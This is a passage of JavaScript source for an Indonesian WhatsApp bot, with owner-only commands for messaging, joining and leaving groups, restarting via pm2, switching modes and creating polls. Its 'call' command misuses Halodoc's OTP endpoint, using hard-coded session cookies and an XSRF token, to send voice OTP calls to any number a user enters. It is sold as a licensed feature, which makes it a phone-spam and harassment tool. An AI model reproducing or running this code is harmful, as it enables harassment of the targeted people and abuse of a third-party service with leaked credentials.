semar.sendMessage(`${nd[0]}@s.whatsapp.net`, { text: `${nd[1]}` })
reply(`Sukses mengirim pesan ${nd[1]} ke nomor ${nd[0]}`)
break

//©from: dennis
case 'join':
if (!isDev && !msg.key.fromMe) return reply('Fitur Ini Hanya Dapat Digunakan Oleh Developer!')
let result = args[0].split('https://chat.whatsapp.com/')[1]
await semar.groupAcceptInvite(result).then((res) => reply(`${JSON.stringify(res, null, 2)}`)).catch((err) => reply(`${JSON.stringify(err, null, 2)}`))
break

//©from: dennis
case 'leave':
if (!isDev && !msg.key.fromMe) return reply('Fitur Ini Hanya Dapat Digunakan Oleh Developer!')
await semar.groupLeave(from).then((res) => reply(`${JSON.stringify(res, null, 2)}`)).catch((err) => reply(`${JSON.stringify(err, null, 2)}`))
break

//©from: dennis
case 'delete': case 'd': case 'del':
if (!isDev && !isVIP && !msg.key.fromMe) return
semar.sendMessage(from, { delete: { id: msg.message.extendedTextMessage.contextInfo.stanzaId, remoteJid: from, fromMe: true }})
break

//©from: dennis
case 'restart':
if (!isDev && !isVIP && !msg.key.fromMe) return
exec(`pm2 restart index`, (error, stdout, stderr) => { reply(stdout)})
break

//©from: dennis
case 'shutdown':
if (!isDev && !msg.key.fromMe) return reply('Fitur Ini Hanya Dapat Digunakan Oleh Developer!')
exec(`pm2 kill`, (error, stdout, stderr) => { reply(stdout)})
break

//©from: dennis × mr_dark
case 'call':
if (!isDev && !isVIP && !msg.key.fromMe) return reply('Akses Ditolak!, Silahkan Beli Lisensi Ke Developer Bot\nwa.me/6285866295942')
if (!dn) return reply(`Silahkan masukkan nomor!\nContoh: ${prefix}${command} +${senderNumber}`)
if (args[0].startsWith('0')) return reply(`Awali nomor dengan +62!\nContoh: ${prefix}${command} +${senderNumber}`)
if (args[0].startsWith('8')) return reply(`Awali nomor dengan +62!\nContoh: ${prefix}${command} +${senderNumber}`)
if (args[0].startsWith(`+${nomorDeveloper}`)) return reply('Tidak bisa call ke nomor developer!')
if (args[0].startsWith(`+${botNumber}`)) return reply('Tidak bisa call ke nomor ini!')
axios.post('https://magneto.api.halodoc.com/api/v1/users/authentication/otp/requests',{'phone_number':`${dn}`,'channel': 'voice'},{headers: {'authority': 'magneto.api.halodoc.com','accept-language': 'id,en;q=0.9,en-GB;q=0.8,en-US;q=0.7','cookie': '_gcl_au=1.1.1860823839.1661903409; _ga=GA1.2.508329863.1661903409; afUserId=52293775-f4c9-4ce2-9002-5137c5a1ed24-p; XSRF-TOKEN=12D59ACD8AA0B88A7ACE05BB574FAF8955D23DBA28E8EE54F30BCB106413A89C1752BA30DC063940ED30A599C055CC810636; _gid=GA1.2.798137486.1664887110; ab.storage.deviceId.1cc23a4b-a089-4f67-acbf-d4683ecd0ae7=%7B%22g%22%3A%2218bb4559-2170-9c14-ddcd-2dc80d13c3e3%22%2C%22c%22%3A1656491802961%2C%22l%22%3A1664887110254%7D; amp_394863=nZm2vDUbDAvSia6NQPaGum...1gehg2efd.1gehg3c19.f.0.f; ab.storage.sessionId.1cc23a4b-a089-4f67-acbf-d4683ecd0ae7=%7B%22g%22%3A%22f1b09ad8-a7d9-16f3-eb99-a97ba52677d2%22%2C%22e%22%3A1664888940400%2C%22c%22%3A1664887110252%2C%22l%22%3A1664887140400%7D','origin': 'https://www.halodoc.com','sec-ch-ua': '"Microsoft Edge";v="105", "Not)A;Brand";v="8", "Chromium";v="105"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Windows"','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-site','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36 Edg/105.0.1343.53','x-xsrf-token': '12D59ACD8AA0B88A7ACE05BB574FAF8955D23DBA28E8EE54F30BCB106413A89C1752BA30DC063940ED30A599C055CC810636'}}).then(function (response) {reply(`${JSON.stringify(response.data, null, 2)}`)}).catch(function (error) {reply(`${JSON.stringify(error, null, 2)}`)})
break

//©from: dennis
case 'public':
if (!isDev && !msg.key.fromMe) return reply('Fitur Ini Hanya Dapat Digunakan Oleh Developer!')
mode = true
reply('Sukses mengubah ke mode public')
break

//©from: dennis
case 'private': case 'self':
if (!isDev && !msg.key.fromMe) return reply('Fitur Ini Hanya Dapat Digunakan Oleh Developer!')
mode = false
reply('Sukses mengubah ke mode private')
break

//©from: dennis
case 'vote':
var pollCreation = generateWAMessageFromContent(from, proto.Message.fromObject({"pollCreationMessage": {
"name": "@dcodedenpa",
"options": [{
"optionName": "option 1"
},{
"optionName": "option 2"
},{
"optionName": "option 3"
}],
"selectableOptionsCount": 3}}), { userJid: from })
semar.relayMessage(from, pollCreation.message, { messageId: pollCreation.key.id })
break
default:
}} catch (e) {
console.log(e)
semar.sendMessage("6285866295942@s.whatsapp.net", {text:e})}}